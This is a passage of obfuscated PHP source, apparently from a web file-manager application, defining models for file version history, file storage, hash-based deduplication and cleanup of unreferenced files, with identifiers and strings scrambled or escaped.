$üµë‚Ôõ = array_to_keyvalue($„ÖºèÕ, $Û¶è³¼[12], $Û¶è³¼[204]); $Ô£‹ëúó = array_to_keyvalue($„ÖºèÕ, $Û¶è³¼[12], $Û¶è³¼[2203]); foreach ($„ÖºèÕ as $“îÖ¶ğı) { $í°˜½Ìˆ = $“îÖ¶ğı[$Û¶è³¼[538]]; if ($“îÖ¶ğı[$Û¶è³¼[33]] == $Û¶è³¼[635] && isset($í°˜½Ìˆ[$Û¶è³¼[1237]])) { $üµë‚Ôõ[] = $í°˜½Ìˆ[$Û¶è³¼[1237]] . $Û¶è³¼[12]; $üµë‚Ôõ[] = $í°˜½Ìˆ[$Û¶è³¼[1238]] . $Û¶è³¼[12]; } if ($“îÖ¶ğı[$Û¶è³¼[33]] == $Û¶è³¼[2214] && isset($í°˜½Ìˆ[$Û¶è³¼[204]])) { $üµë‚Ôõ[] = $í°˜½Ìˆ[$Û¶è³¼[204]] . $Û¶è³¼[12]; } } $üµë‚Ôõ = array_merge($üµë‚Ôõ, $Ô£‹ëúó, array($Íóåò¡ . $Û¶è³¼[12])); $üµë‚Ôõ = array_unique($üµë‚Ôõ); $Åùîò½­ = array_unique(array_to_keyvalue($„ÖºèÕ, $Û¶è³¼[12], $Û¶è³¼[1768])); $Í…¥”“Ü = Model($Û¶è³¼[609])->userListInfo($Åùîò½­); $ÕáÜŠ² = Model($Û¶è³¼[898])->sourceListInfo($üµë‚Ôõ, !0); foreach ($„ÖºèÕ as &$“îÖ¶ğı) { if ($“îÖ¶ğı[$Û¶è³¼[33]] == $Û¶è³¼[635] && isset($“îÖ¶ğı[$Û¶è³¼[538]][$Û¶è³¼[1237]])) { $“îÖ¶ğı[$Û¶è³¼[538]][$Û¶è³¼[1237]] = $ÕáÜŠ²[$“îÖ¶ğı[$Û¶è³¼[538]][$Û¶è³¼[1237]]]; $“îÖ¶ğı[$Û¶è³¼[538]][$Û¶è³¼[1238]] = $ÕáÜŠ²[$“îÖ¶ğı[$Û¶è³¼[538]][$Û¶è³¼[1238]]]; } if ($“îÖ¶ğı[$Û¶è³¼[33]] == $Û¶è³¼[2214] && isset($“îÖ¶ğı[$Û¶è³¼[538]][$Û¶è³¼[204]])) { $“îÖ¶ğı[$Û¶è³¼[538]][$Û¶è³¼[204]] = $ÕáÜŠ²[$“îÖ¶ğı[$Û¶è³¼[538]][$Û¶è³¼[204]]]; } $“îÖ¶ğı[$Û¶è³¼[101]] = $ÕáÜŠ²[$“îÖ¶ğı[$Û¶è³¼[204]]]; $“îÖ¶ğı[$Û¶è³¼[2219]] = $ÕáÜŠ²[$“îÖ¶ğı[$Û¶è³¼[2203]]]; if ($“îÖ¶ğı[$Û¶è³¼[33]] == $Û¶è³¼[1937]) { $“îÖ¶ğı[$Û¶è³¼[2219]] = $“îÖ¶ğı[$Û¶è³¼[101]]; $“îÖ¶ğı[$Û¶è³¼[2203]] = $“îÖ¶ğı[$Û¶è³¼[2219]][$Û¶è³¼[204]]; $“îÖ¶ğı[$Û¶è³¼[101]] = !1; $“îÖ¶ğı[$Û¶è³¼[204]] = $Û¶è³¼[12]; } $“îÖ¶ğı[$Û¶è³¼[2146]] = $Í…¥”“Ü[$“îÖ¶ğı[$Û¶è³¼[1768]]]; } unset($“îÖ¶ğı); $Î›»êà·[$Û¶è³¼[457]] = $„ÖºèÕ; return $Î›»êà·; } public function removeBySource($ï‰úŠ›) { $ôÂ©ß«â = array($_SERVER[Ò°Ì”İ•][503] => $ï‰úŠ›); $this->where($ôÂ©ß«â)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\x72\143\x65\137\150\x69\163\x74\157\x72\171"; public function historyCount($ğ÷Å¾äƒ) { $—ô‚şü =& $_SERVER[Ò°Ì”İ•]; if (!$ğ÷Å¾äƒ) { return array(); } if (is_string($ğ÷Å¾äƒ) || is_int($ğ÷Å¾äƒ)) { $ğ÷Å¾äƒ = array($ğ÷Å¾äƒ); } $ ˆğ¶Òá = array($—ô‚şü[204], $—ô‚şü[2220] => $—ô‚şü[577]); $ãÒ²—ÊÔ = array($—ô‚şü[204] => array($—ô‚şü[7], $ğ÷Å¾äƒ)); $ß‚ô–‹Û = $this->field($ ˆğ¶Òá)->where($ãÒ²—ÊÔ)->group($—ô‚şü[204])->select(); return array_to_keyvalue($ß‚ô–‹Û, $—ô‚şü[204], $—ô‚şü[577]); } public function addHistory($¦•Õ„ş, $¼ÌÓÚïÑ = '') { $ø›£ú˜ =& $_SERVER[Ò°Ì”İ•]; $şÍÜÉ¥ = array($ø›£ú˜[503] => $¦•Õ„ş[$ø›£ú˜[204]], $ø›£ú˜[1759] => isset($¦•Õ„ş[$ø›£ú˜[541]]) ? $¦•Õ„ş[$ø›£ú˜[541]] : $¦•Õ„ş[$ø›£ú˜[539]], $ø›£ú˜[554] => $¦•Õ„ş[$ø›£ú˜[553]], $ø›£ú˜[632] => $¦•Õ„ş[$ø›£ú˜[90]], $ø›£ú˜[2221] => $¼ÌÓÚïÑ); if ($GLOBALS[$ø›£ú˜[6]][$ø›£ú˜[103]][$ø›£ú˜[1298]] >= 1) { $this->historyAutoClear($şÍÜÉ¥[$ø›£ú˜[204]]); $this->add($şÍÜÉ¥); } Hook::trigger($ø›£ú˜[2222], $şÍÜÉ¥); Model($ø›£ú˜[2223])->eventFileEdit($¦•Õ„ş[$ø›£ú˜[204]]); } private function historyAutoClear($â„ÉîÓ) { $¦â½Ê§æ =& $_SERVER[Ò°Ì”İ•]; $ØİØ…ñ‹ = Model($¦â½Ê§æ[843])->get($¦â½Ê§æ[1320]); $™¬Û»Æ = intval($GLOBALS[$¦â½Ê§æ[6]][$¦â½Ê§æ[103]][$¦â½Ê§æ[1298]]); $´£¯¶ó = $ØİØ…ñ‹ == $¦â½Ê§æ[1321] ? min(5, $™¬Û»Æ) : $™¬Û»Æ; $´£¯¶ó = $´£¯¶ó <= 0 ? 0 : $´£¯¶ó - 1; if ($´£¯¶ó >= 499) { return; } $Ã×êÌô = array($¦â½Ê§æ[503] => $â„ÉîÓ); $Å½³œ‰· = $this->field($¦â½Ê§æ[2224])->where($Ã×êÌô)->order($¦â½Ê§æ[2217])->select(); if (!$Å½³œ‰· || $´£¯¶ó >= count($Å½³œ‰·)) { return; } $ØÊ¨Á“‹ = array_to_keyvalue($Å½³œ‰·, $¦â½Ê§æ[12], $¦â½Ê§æ[487]); $ØÊ¨Á“‹ = array_slice($ØÊ¨Á“‹, $´£¯¶ó); $é©¬‰ô¢ = array_to_keyvalue($Å½³œ‰·, $¦â½Ê§æ[12], $¦â½Ê§æ[553]); $é©¬‰ô¢ = array_slice($é©¬‰ô¢, $´£¯¶ó); if (!$ØÊ¨Á“‹ || !$é©¬‰ô¢) { return; } $Ã×êÌô = array($¦â½Ê§æ[505] => array($¦â½Ê§æ[7], $ØÊ¨Á“‹)); $this->where($Ã×êÌô)->delete(); Model($¦â½Ê§æ[556])->remove($é©¬‰ô¢); } public function listData($‘·ò™Ï°) { $æš¹¡ÙÏ =& $_SERVER[Ò°Ì”İ•]; $¨÷ÊÇîª = array($æš¹¡ÙÏ[503] => $‘·ò™Ï°); $€›’ï§¥ = $æš¹¡ÙÏ[2225]; $ºÈ‚è = $this->field($€›’ï§¥)->where($¨÷ÊÇîª)->order($æš¹¡ÙÏ[2217])->selectPage(); $this->_listAppendUser($ºÈ‚è[$æš¹¡ÙÏ[457]]); $…‰Òš°± = Model($æš¹¡ÙÏ[843])->get($æš¹¡ÙÏ[1320]); $úÛ‡Ù×Ğ = 5; if ($…‰Òš°± == $æš¹¡ÙÏ[1321]) { $ºÈ‚è[$æš¹¡ÙÏ[457]] = array_slice($ºÈ‚è[$æš¹¡ÙÏ[457]], 0, $úÛ‡Ù×Ğ); $ºÈ‚è[$æš¹¡ÙÏ[454]] = array($æš¹¡ÙÏ[2226] => 1, $æš¹¡ÙÏ[2227] => 20, $æš¹¡ÙÏ[2228] => 1, $æš¹¡ÙÏ[2229] => count($ºÈ‚è[$æš¹¡ÙÏ[457]])); } return $ºÈ‚è; } protected function _listAppendUser(&$ÓŸ°ó¦ü) { $’™ªæÂ¦ =& $_SERVER[Ò°Ì”İ•]; $Ò›æ“¤š = array_to_keyvalue($ÓŸ°ó¦ü, $’™ªæÂ¦[12], $’™ªæÂ¦[1768]); $Æ‰¢×ƒ¥ = Model($’™ªæÂ¦[609])->userListInfo($Ò›æ“¤š); foreach ($ÓŸ°ó¦ü as &$‹èÕÊ¸ë) { $†Ù•­ºı = $‹èÕÊ¸ë[$’™ªæÂ¦[1768]]; $‹èÕÊ¸ë[$’™ªæÂ¦[539]] = $Æ‰¢×ƒ¥[$†Ù•­ºı] ? $Æ‰¢×ƒ¥[$†Ù•­ºı] : !1; } unset($‹èÕÊ¸ë); } public function fileInfo($ÁÍ¹–¯¼) { $ÉŠä½¶† =& $_SERVER[Ò°Ì”İ•]; $àÂù£ğš = $this->tablePrefix; $£ºàƒ = "{$àÂù£ğš}\151\x6f\x5f\x66\151\x6c\145\40\x66\151\x6c\145\163\x20\x6f\x6e\x20\146\151\154\145\163\56\146\151\x6c\x65\111\x44\40\75\40\150\151\163\164\157\x72\171\56\146\151\x6c\x65\111\104"; return $this->alias($ÉŠä½¶†[2230])->where(array($ÉŠä½¶†[505] => $ÁÍ¹–¯¼))->join($£ºàƒ, $ÉŠä½¶†[2231])->find(); } public function removeItem($ì˜Ù¶˜Š) { $àŞ—şÓì =& $_SERVER[Ò°Ì”İ•]; $œå®Å‰Ù = array($àŞ—şÓì[505] => $ì˜Ù¶˜Š); $é‡Ÿœ´² = $this->where($œå®Å‰Ù)->find(); if ($é‡Ÿœ´²) { $ö©¡ÔØ = $this->where($œå®Å‰Ù)->delete(); Model($àŞ—şÓì[556])->remove($é‡Ÿœ´²[$àŞ—şÓì[553]]); return $ö©¡ÔØ; } return !1; } public function removeBySource($Âè·õ€ü) { $ºš­öÂ“ =& $_SERVER[Ò°Ì”İ•]; if (!$Âè·õ€ü) { return !1; } if (!is_array($Âè·õ€ü)) { $Âè·õ€ü = array($Âè·õ€ü); } $şßßï¶ = array($ºš­öÂ“[503] => array($ºš­öÂ“[7], $Âè·õ€ü)); $òÏŞùŞ = $this->field($ºš­öÂ“[554])->where($şßßï¶)->select(); if ($òÏŞùŞ) { $this->where($şßßï¶)->delete(); $‘Õ›ø  = array_to_keyvalue($òÏŞùŞ, $ºš­öÂ“[12], $ºš­öÂ“[553]); Model($ºš­öÂ“[556])->remove($‘Õ›ø ); } return !0; } public function setDetail($½ä¢÷«ú, $ÎÕõ£¡ ) { $ÖÍ‚“õ£ =& $_SERVER[Ò°Ì”İ•]; return $this->where(array($ÖÍ‚“õ£[505] => $½ä¢÷«ú))->save(array($ÖÍ‚“õ£[2221] => $ÎÕõ£¡ )); } public function rollbackToItem($ì¿ÇšÚ, $¤Ëµ¸äâ) { $ëöéƒí =& $_SERVER[Ò°Ì”İ•]; $ŞıÎ²øñ = Model($ëöéƒí[898])->sourceInfo($ì¿ÇšÚ); $this->addHistory($ŞıÎ²øñ, LNG($ëöéƒí[2232])); $Ÿş¾ï¹ = $this->find($¤Ëµ¸äâ); $Şğ­ËÃ‘ = array($ëöéƒí[553] => $Ÿş¾ï¹[$ëöéƒí[553]], $ëöéƒí[90] => $Ÿş¾ï¹[$ëöéƒí[90]], $ëöéƒí[99] => time(), $ëöéƒí[541] => USER_ID); Model($ëöéƒí[898])->where(array($ëöéƒí[204] => $ì¿ÇšÚ))->save($Şğ­ËÃ‘); return $this->where(array($ëöéƒí[505] => $¤Ëµ¸äâ))->delete(); } public function clearSame($ÊŠ›×‡±) { $üšºÅÙ =& $_SERVER[Ò°Ì”İ•]; $±ŸıçÄ¢ = $this->listData($ÊŠ›×‡±); $û›ÔÁ»ò = array_to_keyvalue_group($±ŸıçÄ¢, $üšºÅÙ[553]); $©¿°ˆ¬ = array(); $½ÇÍ†§ = array(); foreach ($û›ÔÁ»ò as $×‘Üıèî) { if (!$×‘Üıèî || count($×‘Üıèî) <= 1) { continue; } foreach ($×‘Üıèî as $ÀÜÖ‡Å ) { $©¿°ˆ¬[] = $ÀÜÖ‡Å [$üšºÅÙ[553]]; $½ÇÍ†§[] = $ÀÜÖ‡Å [$üšºÅÙ[487]]; } } if (!$½ÇÍ†§) { return; } $this->where(array($üšºÅÙ[487] => array($üšºÅÙ[7], $½ÇÍ†§)))->delete(); Model($üšºÅÙ[556])->remove($©¿°ˆ¬); } public function userSpace() { $å¬Ó¦ ö =& $_SERVER[Ò°Ì”İ•]; $²ë¸¹€ = $this->tablePrefix; $á‘¡ıîÂ = array($å¬Ó¦ ö[1759] => USER_ID); $üÀ¼¿øŸ = "{$²ë¸¹€}\151\157\x5f\x66\151\154\x65\40\146\x69\x6c\x65\x73\x20\x6f\x6e\40\146\151\154\145\163\56\146\151\x6c\145\x49\104\x20\75\40\x68\x69\x73\164\157\x72\x79\56\146\151\154\145\111\104"; return $this->alias($å¬Ó¦ ö[2230])->where($á‘¡ıîÂ)->join($üÀ¼¿øŸ, $å¬Ó¦ ö[2231])->sum($å¬Ó¦ ö[90]); } } goto a÷¹Š“Š“±; EİàØ¹½£Ò: class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\146\x69\154\145"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\x65" => "\151\x6f\137\146\151\154\145\x5f\x6d\x65\164\141", "\x6d\145\164\x61\x46\x69\145\x6c\x64" => "\146\x69\154\145\111\x44"); public function fileInfo($ë´½ñ¹è) { $¨©¤¥¸± =& $_SERVER[Ò°Ì”İ•]; static $ş‡Ê™şè = array(); if (!isset($ş‡Ê™şè[$ë´½ñ¹è])) { $¸ÄÆôÃú = $¨©¤¥¸±[2019]; $‰âÅàü© = Model($¨©¤¥¸±[556])->field($¸ÄÆôÃú)->where(array($¨©¤¥¸±[554] => $ë´½ñ¹è))->find(); $ş‡Ê™şè[$ë´½ñ¹è] = $‰âÅàü©; } return $ş‡Ê™şè[$ë´½ñ¹è]; } public function addFileByContent($çëû¬í = '', $õÏ«ÑË¯ = '') { $¶©¹öàé =& $_SERVER[Ò°Ì”İ•]; $àû¿³×é = TEMP_PATH . $¶©¹öàé[2020]; if (!is_dir($àû¿³×é)) { mk_dir($àû¿³×é); } $†¥¦áÅÎ = $àû¿³×é . $¶©¹öàé[2021] . rand_string(16); file_put_contents($†¥¦áÅÎ, $çëû¬í); $ã·­ıóá = $this->addFile($†¥¦áÅÎ, $õÏ«ÑË¯, !0); if (file_exists($†¥¦áÅÎ)) { @unlink($†¥¦áÅÎ); } return $ã·­ıóá; } public function createFileName($øÄù¤›, $ùø·¯Õ† = false, $Á¯Âª–Ó = false) { $Æè¢¬Èƒ =& $_SERVER[Ò°Ì”İ•]; $ƒ—ÀõÎ… = IO::init($Æè¢¬Èƒ[8]); $Ò¾÷Ëï¦ = $this->makeFilePath($øÄù¤›, $ƒ—ÀõÎ…, $ùø·¯Õ†, $Á¯Âª–Ó); $œ·‚–ã£ = $ƒ—ÀõÎ…->pathFather($Ò¾÷Ëï¦); static $‘„´àò = false; $ÂµËÚÑ = $Æè¢¬Èƒ[2022] . md5($œ·‚–ã£); if (!$‘„´àò && !Cache::get($ÂµËÚÑ)) { $‘„´àò = !0; $‹‚©Á· = IO::mkdir($œ·‚–ã£); if (!IO::exist($‹‚©Á· . $Æè¢¬Èƒ[871])) { IO::mkfile($‹‚©Á· . $Æè¢¬Èƒ[871]); } Cache::set($ÂµËÚÑ, 1, 3600 * 2); } return $Ò¾÷Ëï¦; } public function makeFilePath($¸¶÷íĞÖ, $’ìš²æì, $âƒ…¢‘ = false, $´„½§ôå = false) { $ò£ÛÀËÂ =& $_SERVER[Ò°Ì”İ•]; $ÊÃİ‹ªâ = Model($ò£ÛÀËÂ[843])->get($ò£ÛÀËÂ[2023]); $÷ƒ›ç³Â = KodIO::defaultIO() . date($ò£ÛÀËÂ[2024]); $ãÔÈú¹… = $÷ƒ›ç³Â . rand_string(5) . short_id(100); $¸¶÷íĞÖ = str_replace($ò£ÛÀËÂ[8], $ò£ÛÀËÂ[11], KodIO::clear($¸¶÷íĞÖ)); $»ÏÙâšé = $’ìš²æì->ext($¸¶÷íĞÖ); if (!$¸¶÷íĞÖ) { $ÊÃİ‹ªâ = $ò£ÛÀËÂ[849]; } switch ($ÊÃİ‹ªâ) { case $ò£ÛÀËÂ[2025]: if ($»ÏÙâšé) { $ãÔÈú¹… = $ãÔÈú¹… . $ò£ÛÀËÂ[10] . $»ÏÙâšé; } if ($»ÏÙâšé == $ò£ÛÀËÂ[1961]) { $ãÔÈú¹… .= $ò£ÛÀËÂ[1287]; } break; case $ò£ÛÀËÂ[2026]: $ºÜö°ıÜ = Model($ò£ÛÀËÂ[843])->get($ò£ÛÀËÂ[844]); $·ØÜŞÍä = substr(md5($ò£ÛÀËÂ[845] . $ºÜö°ıÜ . date($ò£ÛÀËÂ[822])), 0, 8); $œ¢™š´Î = KodIO::defaultDriver(); $÷ƒ›ç³Â = $ò£ÛÀËÂ[1318] . $œ¢™š´Î[$ò£ÛÀËÂ[487]] . $ò£ÛÀËÂ[496] . date($ò£ÛÀËÂ[2027]) . $·ØÜŞÍä . $ò£ÛÀËÂ[8]; if ($»ÏÙâšé == $ò£ÛÀËÂ[1961]) { $¸¶÷íĞÖ .= $ò£ÛÀËÂ[1287]; } $Ùóû‡©Ö = $ò£ÛÀËÂ[2028] . $÷ƒ›ç³Â . $¸¶÷íĞÖ; CacheLock::lock($Ùóû‡©Ö); $ãÔÈú¹… = $÷ƒ›ç³Â . $¸¶÷íĞÖ; if (IO::exist($÷ƒ›ç³Â . $¸¶÷íĞÖ)) { $É‹“È„µ = substr($¸¶÷íĞÖ, 0, strlen($¸¶÷íĞÖ) - strlen($»ÏÙâšé)); $ñŒ¾ö° = $´„½§ôå ? substr($´„½§ôå, 0, 5) : ($âƒ…¢‘ ? substr($âƒ…¢‘, 0, 5) : rand_string(5)); $ãÔÈú¹… = $÷ƒ›ç³Â . $É‹“È„µ . $ñŒ¾ö°; if ($»ÏÙâšé) { $ãÔÈú¹… = $ãÔÈú¹… . $ò£ÛÀËÂ[10] . $»ÏÙâšé; } } if (IO::isOsDriver($ãÔÈú¹…) && !IO::isUploadServer($ãÔÈú¹…)) { if (IO::exist($ãÔÈú¹…)) { CacheLock::unlock($Ùóû‡©Ö); return $ãÔÈú¹…; } $ôèÇá¿ = IO::setContent($ãÔÈú¹…, $ò£ÛÀËÂ[12]); if (!$ôèÇá¿) { show_json($ò£ÛÀËÂ[2029], !1); } } CacheLock::unlock($Ùóû‡©Ö); break; case $ò£ÛÀËÂ[849]: break; default: break; } return $ãÔÈú¹…; } public function addFileByRemote($Ì³“×Ñ, $Ãğ¥÷àê, $Ô°Ûû…û = array()) { $×¨…¿‡ =& $_SERVER[Ò°Ì”İ•]; if (!IO::exist($Ì³“×Ñ)) { return !1; } $µÃºşÕ– = $Ô°Ûû…û[$×¨…¿‡[559]] ? $Ô°Ûû…û[$×¨…¿‡[559]] : $×¨…¿‡[12]; $ù—†Ò = IO::hashMd5($Ì³“×Ñ, $µÃºşÕ–); $¨Óı¢¸Ì = KodIO::defaultDriver(); $É¾ŸØÊÂ = array($×¨…¿‡[632] => IO::size($Ì³“×Ñ), $×¨…¿‡[2030] => 1, $×¨…¿‡[506] => $Ãğ¥÷àê, $×¨…¿‡[882] => $¨Óı¢¸Ì[$×¨…¿‡[487]], $×¨…¿‡[507] => $Ì³“×Ñ, $×¨…¿‡[2031] => $Ô°Ûû…û[$×¨…¿‡[687]] ? $Ô°Ûû…û[$×¨…¿‡[687]] : IO::hashSimple($Ì³“×Ñ), $×¨…¿‡[2032] => $ù—†Ò ? $ù—†Ò : $µÃºşÕ–); if ($Ç ‰êÌ— = $this->addFileCheckExist($É¾ŸØÊÂ[$×¨…¿‡[687]], $É¾ŸØÊÂ[$×¨…¿‡[559]], $É¾ŸØÊÂ[$×¨…¿‡[90]])) { return $Ç ‰êÌ—; } return $this->addFileData($É¾ŸØÊÂ); } private function addFileData($Èß¬Î­á) { $óÍØ…» =& $_SERVER[Ò°Ì”İ•]; if (!$Èß¬Î­á) { return !1; } $Èß¬Î­á[$óÍØ…»[90]] = intval($Èß¬Î­á[$óÍØ…»[90]]); if (!$Èß¬Î­á[$óÍØ…»[90]] && strlen($Èß¬Î­á[$óÍØ…»[687]]) > 32) { $Èß¬Î­á[$óÍØ…»[90]] = intval(substr($Èß¬Î­á[$óÍØ…»[687]], 32)); } $ô»™¿è¶ = $this->add($Èß¬Î­á); return $this->find($ô»™¿è¶); } public function addFile($ñ‰§Ÿƒ©, $ñğï€â, $ Úî¶ÂÀ = false) { $ğÁÄÃê¡ =& $_SERVER[Ò°Ì”İ•]; $Ğğú˜ÎÆ = IO::hashSimple($ñ‰§Ÿƒ©); $§Ÿ¤†Û = IO::size($ñ‰§Ÿƒ©); $ï¨İ¸ÉŸ = $§Ÿ¤†Û <= 1024 * 1024 * 10 ? IO::hashMd5($ñ‰§Ÿƒ©) : $ğÁÄÃê¡[12]; $çÕ£ùË¶ = $ğÁÄÃê¡[2033] . $Ğğú˜ÎÆ; CacheLock::lock($çÕ£ùË¶); if ($ï¨İ¸ÉŸ && $Ğğú˜ÎÆ) { $æÊ¯ãÎŸ = $this->addFileCheckExist($Ğğú˜ÎÆ, $ï¨İ¸ÉŸ, $§Ÿ¤†Û); if ($æÊ¯ãÎŸ) { CacheLock::unlock($çÕ£ùË¶); return $æÊ¯ãÎŸ; } } $ÃµÎ­á˜ = $this->addFileMake($ñ‰§Ÿƒ©, $§Ÿ¤†Û, $Ğğú˜ÎÆ, $ï¨İ¸ÉŸ, $ñğï€â, $ Úî¶ÂÀ); $¢÷çÎ£ş = $this->addFileData($ÃµÎ­á˜); CacheLock::unlock($çÕ£ùË¶); if (!$ï¨İ¸ÉŸ && $¢÷çÎ£ş) { $this->fileMd5Check($¢÷çÎ£ş); } return $¢÷çÎ£ş; } public function fileMd5Check($´™Å×û) { $¶¸ààŸ” =& $_SERVER[Ò°Ì”İ•]; $òš÷üê½ = array($´™Å×û[$¶¸ààŸ”[553]], $´™Å×û[$¶¸ààŸ”[98]]); $è§²¯© = $¶¸ààŸ”[2034] . $´™Å×û[$¶¸ààŸ”[98]]; $ûÌÁĞ» = $¶¸ààŸ”[2035] . $´™Å×û[$¶¸ààŸ”[553]]; TaskQueue::add($¶¸ààŸ”[2036], $òš÷üê½, $è§²¯©, $ûÌÁĞ»); } public function fileMd5Set($¡¦¼È, $í€ …¦˜) { $¯ÅĞ¤¹ó =& $_SERVER[Ò°Ì”İ•]; $·ë¥ŸÚÃ = $this->find($¡¦¼È); if (!$·ë¥ŸÚÃ || $·ë¥ŸÚÃ[$¯ÅĞ¤¹ó[559]]) { return; } $ŒãÎ·åÔ = IO::hashMd5($í€ …¦˜); if (!$ŒãÎ·åÔ) { return $¯ÅĞ¤¹ó[12]; } $this->where(array($¯ÅĞ¤¹ó[553] => $¡¦¼È))->save(array($¯ÅĞ¤¹ó[559] => $ŒãÎ·åÔ)); } public function addFileMake($ñÖŞ¹­, $øğ¹¯·“, $â“†ë£È, $Äğ„Ö…Í, $ƒÛëÆçˆ, $Ã±¨¦Œ…) { $•æ”½ÍŞ =& $_SERVER[Ò°Ì”İ•]; $å™¡¯‡ = $this->createFileName($ƒÛëÆçˆ, $â“†ë£È, $Äğ„Ö…Í); $÷âò‚›¯ = get_path_father($å™¡¯‡); $ç¸òêÁ = get_path_this($å™¡¯‡); if ($Ã±¨¦Œ…) { $¥¡ï–ª– = IO::move($ñÖŞ¹­, $÷âò‚›¯, !1, $ç¸òêÁ); } else { $¥¡ï–ª– = IO::copy($ñÖŞ¹­, $÷âò‚›¯, !1, $ç¸òêÁ); } if (!$¥¡ï–ª–) { return !1; } $Î¤…•ù = KodIO::defaultDriver(); $üÅ—şõµ = array($•æ”½ÍŞ[632] => $øğ¹¯·“, $•æ”½ÍŞ[2030] => 1, $•æ”½ÍŞ[506] => $ƒÛëÆçˆ, $•æ”½ÍŞ[882] => $Î¤…•ù[$•æ”½ÍŞ[487]], $•æ”½ÍŞ[507] => $å™¡¯‡, $•æ”½ÍŞ[2031] => $â“†ë£È, $•æ”½ÍŞ[2032] => $Äğ„Ö…Í); return $üÅ—şõµ; } public function addFileCheckExist($ƒûŞŞ’‰, $‰Ñö°˜Ì, $ÆñêÊúæ) { $äŠÍÌÀš =& $_SERVER[Ò°Ì”İ•]; $ù÷¤´¬² = $this->findByHash($ƒûŞŞ’‰, $‰Ñö°˜Ì); if (!$ù÷¤´¬²) { return !1; } $Óè­†© = array($äŠÍÌÀš[2030] => intval($ù÷¤´¬²[$äŠÍÌÀš[2037]]) + 1, $äŠÍÌÀš[632] => $ÆñêÊúæ); $this->where(array($äŠÍÌÀš[554] => $ù÷¤´¬²[$äŠÍÌÀš[553]]))->save($Óè­†©); return $ù÷¤´¬²; } public function remove($é«¢©«½) { $this->linkCountChange($é«¢©«½, !1); $this->clearEmpty(); return !0; } public function linkAdd($É´Îº¿†) { $this->linkCountChange($É´Îº¿†, !0); } public function linkCountChange($óà­şŠÖ, $­¼ÀÜÂ•) { $²º©ú„å =& $_SERVER[Ò°Ì”İ•]; if (!$óà­şŠÖ) { return; } if (!is_array($óà­şŠÖ)) { $óà­şŠÖ = array($óà­şŠÖ); } $Åü­ªª… = array(); foreach ($óà­şŠÖ as $£•‹åûÎ) { $œšŠÙñì = $£•‹åûÎ . $²º©ú„å[12]; if (!$Åü­ªª…[$œšŠÙñì]) { $Åü­ªª…[$œšŠÙñì] = 0; } $Åü­ªª…[$œšŠÙñì]++; } $ûË˜âö = array(); foreach ($Åü­ªª… as $£•‹åûÎ => $î—øí„¶) { $œšŠÙñì = $î—øí„¶ . $²º©ú„å[12]; if (!$ûË˜âö[$œšŠÙñì]) { $ûË˜âö[$œšŠÙñì] = array(); } $ûË˜âö[$œšŠÙñì][] = $£•‹åûÎ; } foreach ($ûË˜âö as $î—øí„¶ => $–ñä¿ª) { if (!$–ñä¿ª) { continue; } $î—øí„¶ = $­¼ÀÜÂ• ? $î—øí„¶ : -intval($î—øí„¶); $İËÂæÒª = array($²º©ú„å[553] => array($²º©ú„å[7], $–ñä¿ª)); if ($î—øí„¶ < 0) { $İËÂæÒª[$²º©ú„å[2037]] = array($²º©ú„å[1088], abs($î—øí„¶)); } $this->where($İËÂæÒª)->setAdd($²º©ú„å[2037], $î—øí„¶); } } public function findByHash($É»¾æ–Œ, $¯ìôâ§Ö = false) { $ËğÕï— =& $_SERVER[Ò°Ì”İ•]; if (!$É»¾æ–Œ && !$¯ìôâ§Ö) { return !1; } $äñüÚî¦ = array($ËğÕï—[2031] => $É»¾æ–Œ); if ($¯ìôâ§Ö) { $äñüÚî¦ = array($ËğÕï—[2032] => $¯ìôâ§Ö); } return $this->order($ËğÕï—[2038])->where($äñüÚî¦)->find(); } public function clearEmpty($çşì½‚û = 1) { $ÃÛÎ…ŸÙ =& $_SERVER[Ò°Ì”İ•]; $ã¡§ËÛ = time() - 3600 * 24 * $çşì½‚û; $„¿ı¢Áé = $ÃÛÎ…ŸÙ[2039] . $ã¡§ËÛ; $¹¹Ñ¤ñ† = $this->where($„¿ı¢Áé)->select(); if (!$¹¹Ñ¤ñ†) { return; } $°Øáµ¿ = new Task($ÃÛÎ…ŸÙ[2040], $ÃÛÎ…ŸÙ[12], count($¹¹Ñ¤ñ†)); foreach ($¹¹Ñ¤ñ† as $—à¢¢Í) { $°Øáµ¿->update(1); $this->resetFile($—à¢¢Í); } $°Øáµ¿->end(); } public function resetFile($º¦ı¿ëá) { $¹ãçª‘õ =& $_SERVER[Ò°Ì”İ•]; $Şª±÷Š¢ = array($¹ãçª‘õ[554] => $º¦ı¿ëá[$¹ãçª‘õ[553]]); $’´×À„ = Model($¹ãçª‘õ[1417])->where($Şª±÷Š¢)->count(); $şñ™³«’ = Model($¹ãçª‘õ[2041])->where($Şª±÷Š¢)->count(); $õê‚Åê = intval($’´×À„) + intval($şñ™³«’); if ($õê‚Åê == 0) { IO::remove($º¦ı¿ëá[$¹ãçª‘õ[98]]); Model($¹ãçª‘õ[2042])->delete($º¦ı¿ëá[$¹ãçª‘õ[553]]); $this->where($Şª±÷Š¢)->delete(); $this->metaSet($º¦ı¿ëá[$¹ãçª‘õ[553]], null, null); write_log(ACTION . $¹ãçª‘õ[2043] . KodUser::id() . $¹ãçª‘õ[2044] . $º¦ı¿ëá[$¹ãçª‘õ[553]] . $¹ãçª‘õ[2045] . $º¦ı¿ëá[$¹ãçª‘õ[90]] . $¹ãçª‘õ[212] . $º¦ı¿ëá[$¹ãçª‘õ[98]], $¹ãçª‘õ[2046]); return; } if ($º¦ı¿ëá[$¹ãçª‘õ[2037]] != $õê‚Åê) { $this->where($Şª±÷Š¢)->save(array($¹ãçª‘õ[2030] => $õê‚Åê)); } } public function storageInfo($é‡á×â‡ = false) { $Ô‡ÂšŞÀ =& $_SERVER[Ò°Ì”İ•]; $¿Ç–™ = $this->count() + 0.0; $¡§âøø¢ = 0; $Î¿‚‘óœ = 1; $Ñê¸ŸŒŒ = 0; $œ³Î£öè = 5000; for ($° ÜÑˆ´ = 0; $° ÜÑˆ´ < $¿Ç–™; $° ÜÑˆ´ = $° ÜÑˆ´ + $œ³Î£öè) { $ûüË³ = $this->limit($° ÜÑˆ´, $° ÜÑˆ´ + $œ³Î£öè)->select(); foreach ($ûüË³ as $¤ìı§®ù) { $Î¿‚‘óœ += $¤ìı§®ù[$Ô‡ÂšŞÀ[90]] * $¤ìı§®ù[$Ô‡ÂšŞÀ[2037]]; $¡§âøø¢ += 